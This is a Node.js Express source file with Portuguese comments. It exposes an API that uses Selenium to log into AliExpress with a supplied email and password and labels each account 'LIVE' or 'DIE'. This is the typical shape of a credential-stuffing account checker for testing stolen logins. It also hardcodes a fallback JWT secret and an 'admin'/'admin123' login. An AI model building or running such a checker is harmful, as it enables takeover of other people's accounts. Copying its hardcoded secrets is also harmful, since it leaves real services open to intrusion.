import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';
import jwt from 'jsonwebtoken'; // Importando o JWT

const app = express();
const port = 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'seuSegredoAqui'; // Defina sua chave secreta do JWT

// Middleware para processar JSON
app.use(bodyParser.json());

// Middleware de autenticação JWT
const authenticateJWT = (req, res, next) => {
    const token = req.headers.authorization?.split(' ')[1]; // Extrai o token do cabeçalho

    if (!token) {
        return res.status(403).json({ message: 'Acesso negado, token não fornecido.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ message: 'Token inválido ou expirado.' });
        }
        req.user = user; // Adiciona o usuário ao objeto de requisição
        next();
    });
};

// Endpoint para verificar login no site do AliExpress, protegido por JWT
app.post('/api/check-aliexpress', authenticateJWT, async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // Navegar até a página principal do AliExpress
        await driver.get('https://www.aliexpress.com/');

        // Aceitar cookies ou rejeitar (ajustar o seletor conforme necessário)
        let cookiesAccept = await driver.wait(until.elementLocated(By.css('button#cookie-banner-button')), 10000);
        await cookiesAccept.click();

        // Ir para a página de login
        let loginPage = await driver.wait(until.elementLocated(By.css('.account-icon')), 10000);
        await loginPage.click();

        let loginButton = await driver.findElement(By.css('a.sign-btn'));
        await loginButton.click();

        // Inserir email e senha
        let inputEmail = await driver.wait(until.elementLocated(By.id('fm-login-id')), 10000);
        let inputPassw = await driver.wait(until.elementLocated(By.id('fm-login-password')), 10000);
        let btnLogin = await driver.wait(until.elementLocated(By.css('button.fm-button')), 10000);

        await inputEmail.sendKeys(email);
        await inputPassw.sendKeys(password);

        // Clicar no botão de login
        await btnLogin.click();

        await driver.sleep(3000);

        // Verificar se o login foi bem-sucedido
        let currentUrl = await driver.getCurrentUrl();

        if (currentUrl.includes('login')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ E-mail ou senha inválidos ]`));
            return res.json({ status: 'DIE', message: `Login inválido para o email: ${email}` });
        } else if (currentUrl === 'https://www.aliexpress.com/') {
            console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
            return res.json({ status: 'LIVE', message: `Login bem-sucedido para o email: ${email}` });
        }

    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Erro ao tentar fazer login: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao tentar fazer login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Endpoint para gerar o token JWT
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Exemplo simples de autenticação, adicione sua lógica de verificação aqui
    if (username === 'admin' && password === 'admin123') {
        // Gera um token JWT válido por 1 hora
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        return res.json({ token });
    } else {
        return res.status(401).json({ message: 'Credenciais inválidas.' });
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API do AliExpress rodando em http://localhost:${port}`);
});
